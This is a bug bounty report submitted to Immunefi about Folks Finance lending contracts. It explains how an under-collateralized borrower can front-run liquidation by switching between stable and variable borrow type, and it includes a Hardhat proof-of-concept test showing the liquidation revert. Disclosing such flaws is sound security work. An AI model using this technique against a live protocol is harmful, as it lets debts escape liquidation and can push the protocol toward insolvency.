# Boost \_ Folks Finance 33670 - \[Smart Contract - Insight] Violator can deny his liquidation by front

Submitted on Fri Jul 26 2024 03:25:51 GMT-0400 (Atlantic Standard Time) by @zarkk for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33670

Report type: Smart Contract

Report severity: Insight

Target: <https://testnet.snowtrace.io/address/0x2cAa1315bd676FbecABFC3195000c642f503f1C9>

Impacts:

* Protocol insolvency

## Description

## Brief/Intro

Any violator with under-collateralized loan can front run his liquidation and change borrow type (from stable to variable and vice versa) and prevent it from happening for as long as he wants/needs.

## Vulnerability Details

When someone creates a loan, he has to specify whether he wants to borrow with stable or variable terms by setting the `stableInterestRate` accordingly (0 for variable, >0 for stable). In the same way, if this loan becomes under-collateralized and liquidatable, the liquidator has to has a loan of the same borrow type (variable/stable), so the debt of the violator to be transferred to him. We can see this check in `prepareLiquidation()` function of `LiquidationLogic` library here :

```solidity
function prepareLiquidation(
        // ...
    ) external returns (DataTypes.LoanLiquidityParams memory violatorLiquidity) {
        // ...

        // if applicable, check borrows are compatible
        LoanManagerState.UserLoanBorrow storage violatorLoanBorrow = violatorLoan.borrows[borrPoolId];
        LoanManagerState.UserLoanBorrow storage liquidatorLoanBorrow = liquidatorLoan.borrows[borrPoolId];
        bool isViolatorStableBorrow = violatorLoanBorrow.stableInterestRate > 0;
        bool isLiquidatorStableBorrow = liquidatorLoanBorrow.stableInterestRate > 0;
@>        if (liquidatorLoanBorrow.amount > 0 && isViolatorStableBorrow != isLiquidatorStableBorrow)
            revert BorrowTypeMismatch(loansParams.violatorLoanId, loansParams.liquidatorLoanId, borrPoolId);

        // ....
    }
```

Also, Folks protocol provides the functionality to any borrower to change his borrow type for his loan by calling the `switchBorrowType` function in `Hub` contract and change from stable to variable borrowing and vice versa. We can this here :

```solidity
function _receiveMessage(Messages.MessageReceived memory message) internal override {
        Messages.MessagePayload memory payload = Messages.decodeActionPayload(message.payload);
       
        /// ...

        // switch on payload action
        uint256 index = 0;
        if (payload.action == Messages.Action.CreateAccount) {
            // ...
        } else if (payload.action == Messages.Action.SwitchBorrowType) {
            bytes32 loanId = payload.data.toBytes32(index);
            index += 32;
            uint8 poolId = payload.data.toUint8(index);
            index += 1;
            uint256 maxStableRate = payload.data.toUint256(index);

@>            loanManager.switchBorrowType(loanId, payload.accountId, poolId, maxStableRate);
        } else {
            revert CannotReceiveMessage(message.messageId);
        }

        // ...

        }
    }
```

The vulnerability arises from the fact that there is no check in the whole `switchBorrowType` flow that checks if the specific loan is under-collateralized.

This opens the door for a critical vulnerability where a violator with an under-collateralized loan can "toggle" from stable to variable type calling `switchBorrowType`, every time someone tries to liquidate him. As a result of front running his liquidation and switching borrow type, the validator can assure that he will never be liquidated, since his liquidation will revert on the `BorrowTypeMismatch` which was shown at the start of the report.

## Impact Details

This vulnerability poses a critical risk to the protocol's financial health by allowing the accumulation of bad debt. As under-collateralized loans remain open and potentially worsen without the possibility of liquidation, the protocol could amass significant uncollectable debt. Over time, this accumulation of bad debt could exceed the protocol's available assets, leading to insolvency.

## References

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/Hub.sol#L277> <https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/logic/LiquidationLogic.sol#L127>

## Proof of concept

## Proof of Concept

Add this test in `LoanManager.test.ts` under `Liquidate` section and run `npm run test` :

```solidity
it.only("Should fail to liquidate because borrower changed the borrow type just before the liquidation", async () => {
      const {
        hub,
        loanManager,
        loanManagerAddress,
        oracleManager,
        pools,
        loanId: violatorLoanId,
        accountId,
        loanTypeId,
      } = await loadFixture(depositEtherAndVariableBorrowUSDCFixture);

      // Create Liquidator loan which will be Variable borrow type
      const liquidatorLoanId = getRandomBytes(BYTES32_LENGTH);
      const liquidatorAccountId = getAccountIdBytes("LIQUIDATOR_ACCOUNT_ID");
      const liquidatorLoanName = getRandomBytes(BYTES32_LENGTH);
      await loanManager
        .connect(hub)
        .createUserLoan(liquidatorLoanId, liquidatorAccountId, loanTypeId, liquidatorLoanName);

      // Deposit USDC in the Liquidator loan.
      const liquidatorDepositAmount = BigInt(1000e6);
      const liquidatorDepositFAmount = liquidatorDepositAmount;
      const liquidatorDepositInterestIndex = BigInt(1e18);
      const usdcPrice = BigInt(1e18);
      await pools.USDC.pool.setDepositPoolParams({
        fAmount: liquidatorDepositFAmount,
        depositInterestIndex: liquidatorDepositInterestIndex,
        priceFeed: { price: usdcPrice, decimals: pools.USDC.tokenDecimals },
      });
      await loanManager
        .connect(hub)
        .deposit(liquidatorLoanId, liquidatorAccountId, pools.USDC.poolId, liquidatorDepositAmount);

      // Borrow USDC in liquidator loan.
      const oldLiquidatorVariableInterestIndex = BigInt(1.1e18);
      const stableInterestRate = BigInt(0.1e18);
      await pools.USDC.pool.setBorrowPoolParams({
        variableInterestIndex: oldLiquidatorVariableInterestIndex,
        stableInterestRate,
      });
      const liquidatorBorrowAmount = BigInt(50e6);
      await loanManager
        .connect(hub)
        // We passing stableInterestRate : 0, so BorrowType is VariableBorrow so to match the BorrowType of the ViolatorLoan.
        .borrow(liquidatorLoanId, liquidatorAccountId, pools.USDC.poolId, liquidatorBorrowAmount, 0);

      // Prepare for liquidation
      const ethNodeOutputData = getNodeOutputData(BigInt(1000e18));
      await oracleManager.setNodeOutput(pools.ETH.poolId, pools.ETH.tokenDecimals, ethNodeOutputData);

      // But violator front-runned the liquidator and changed his BorrowType from Variable to Stable so to revert the liquidation.
      const switchBorrowType = await loanManager
        .connect(hub)
        .switchBorrowType(violatorLoanId, accountId, pools.USDC.poolId, BigInt(0.1e18));

      // Trying to liquidate.
      const repayAmount = BigInt(1);
      const minSeizedAmount = BigInt(0);
      const liquidate = loanManager
        .connect(hub)
        .liquidate(
          violatorLoanId,
          liquidatorLoanId,
          liquidatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          repayAmount,
          minSeizedAmount
        );
      const liquidationLogic = await ethers.getContractAt("LiquidationLogic", loanManagerAddress);
      await expect(liquidate)
        .to.be.revertedWithCustomError(liquidationLogic, "BorrowTypeMismatch")
        .withArgs(violatorLoanId, liquidatorLoanId, pools.USDC.poolId);
    });
```
